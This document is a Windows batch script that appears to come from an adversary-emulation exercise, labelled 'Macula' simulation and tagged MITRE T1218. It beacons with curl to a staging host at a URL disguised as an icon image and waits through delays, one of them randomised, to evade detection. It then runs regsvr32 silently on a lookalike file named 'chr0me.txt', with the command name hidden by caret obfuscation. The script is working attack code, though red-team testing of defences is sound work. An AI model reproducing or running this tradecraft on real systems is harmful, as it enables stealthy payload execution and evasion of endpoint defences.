@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET yktnwwf=%APPDATA%\8560\638c866a
SET fpakbq=Macula-Stage0-8560
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8560-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=chr0me.txt
SET fpldhe=8560
SET kfovnb=%APPDATA%\!yydue!\macula-simulations.log

timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_started=initial_delay_complete>> "!kfovnb!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start=attempting>> "!kfovnb!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
if !errorlevel! EQU 0 (SET hb_rslt=1 & SET hb_err=) else (SET hb_rslt=0 & SET hb_err=curl_failed)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_complete=result_!hb_rslt!>> "!kfovnb!" 2>nul
ping -n 8 127.0.0.1 >nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dir_change_start=!yktnwwf!>> "!kfovnb!" 2>nul
cd /d "!yktnwwf!" 2>nul
if !errorlevel! EQU 0 (SET cd_rslt=1) else (SET cd_rslt=0)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dir_change_complete=result_!cd_rslt!>> "!kfovnb!" 2>nul
SET /A dl=%RANDOM% %% 20 + 10
timeout /t !dl! /nobreak >nul

SET vxq=R^e^g^s
SET wsn=v^r^3^2^.^e^x^e
SET tza= /^s
SET rfw= "!edjwtl!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_start=!vxq!!wsn!!tza!!rfw!>> "!kfovnb!" 2>nul
!vxq!!wsn!!tza!!rfw!
if !errorlevel! EQU 0 (SET ttp_rslt=1 & SET ttp_err=) else (SET ttp_rslt=0 & SET ttp_err=regsvr32_failed)
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_rslt!:!ttp_err!>> "!kfovnb!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_complete=result_!ttp_rslt!>> "!kfovnb!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul